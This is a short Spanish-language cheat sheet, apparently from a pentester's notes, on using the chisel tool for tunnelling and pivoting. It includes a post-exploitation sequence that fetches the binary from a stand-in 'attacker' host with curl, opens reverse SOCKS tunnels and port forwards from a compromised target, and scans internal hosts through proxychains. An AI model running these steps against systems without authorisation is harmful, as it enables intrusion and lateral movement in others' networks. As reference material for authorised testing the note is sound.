---
aliases:
tags:
  - tool/chisel
kind: Tool
linked:
  - "[[Pivoting & Port Forwarding]]"
---
# chisel

> [!info]
> TCP/UDP tunnel sobre HTTP con TLS, escrito en Go. Single binary cross-platform. Excelente para pivoting cuando solo HTTP/HTTPS está permitido outbound.

---

## Modo server (attacker)

```bash
# Listener TCP 8000
chisel server --reverse -p 8000
```

---

## Modo client (target)

```bash
# Reverse socks proxy (cliente conecta a server, server expone socks)
chisel client http://attacker:8000 R:socks

# Reverse port forward (puerto interno → attacker)
chisel client http://attacker:8000 R:9999:127.0.0.1:3306

# Forward port (acceder a service interno desde attacker via puerto local)
chisel client http://attacker:8000 1080:socks
```

---

## Setup typical pivoting

1. **Attacker**:
   ```bash
   chisel server --reverse -p 8000
   ```

2. **Target (después de RCE)**:
   ```bash
   # Download
   curl -O http://attacker:8001/chisel
   chmod +x chisel
   
   # Reverse socks proxy
   ./chisel client http://attacker:8000 R:socks &
   ```

3. **Attacker**: usar socks via proxychains
   ```bash
   # proxychains.conf
   socks5 127.0.0.1 1080
   
   proxychains nmap -sT -Pn -p 80,443 internal-target
   ```

---

## Encrypt + auth

```bash
# Server con cert + fingerprint
chisel server --reverse -p 8000 --auth user:pass --tls-cert cert.pem --tls-key key.pem

# Client con auth
chisel client --auth user:pass --fingerprint <fp> https://attacker:8000 R:socks
```

---

## Notas Relacionadas

- [[Pivoting & Port Forwarding]]
- [[Proxychains]]
- [[ncat]]
